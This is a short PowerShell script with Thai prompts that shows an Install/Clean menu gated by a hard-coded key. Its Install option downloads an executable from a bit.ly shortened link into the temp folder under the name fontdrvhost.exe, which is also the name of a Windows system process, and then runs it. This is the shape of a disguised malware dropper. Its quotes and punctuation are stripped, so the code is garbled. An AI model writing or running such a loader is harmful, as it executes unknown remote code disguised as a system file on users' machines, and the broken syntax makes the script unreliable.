Clear-Host

# กำหนด Key ที่ถูกต้อง (คุณสามารถแก้ได้เอง)
$validKey = 1234ABCD

# กำหนดลิงก์ไฟล์ exe
$exeUrl = httpsbit.ly4uBAZh3
$exeOutput = $envTEMPfontdrvhost.exe

# แสดงเมนู
Write-Host === MENU ===
Write-Host 1. Install
Write-Host 2. Clean

$choice = Read-Host เลือกตัวเลือก (1 หรือ 2)

switch ($choice) {
    1 {
        # Install
        $userKey = Read-Host กรุณาใส่ Key
        if ($userKey -eq $validKey) {
            Write-Host Key ถูกต้อง ✅ กำลังติดตั้ง...
            
            # ดาวน์โหลดไฟล์ exe
            Invoke-WebRequest $exeUrl -OutFile $exeOutput
            Start-Process $exeOutput
        } else {
            Write-Host ❌ Key ไม่ถูกต้อง -ForegroundColor Red
        }
    }
    2 {
        # Clean
        Write-Host กำลังลบไฟล์...
        if (Test-Path $exeOutput) {
            Remove-Item $exeOutput -Force
            Write-Host ลบไฟล์เรียบร้อย ✅
        } else {
            Write-Host ไม่พบไฟล์ที่จะลบ -ForegroundColor Yellow
        }
    }
    default {
        Write-Host กรุณาเลือก 1 หรือ 2 เท่านั้น -ForegroundColor Yellow
    }
}

Pause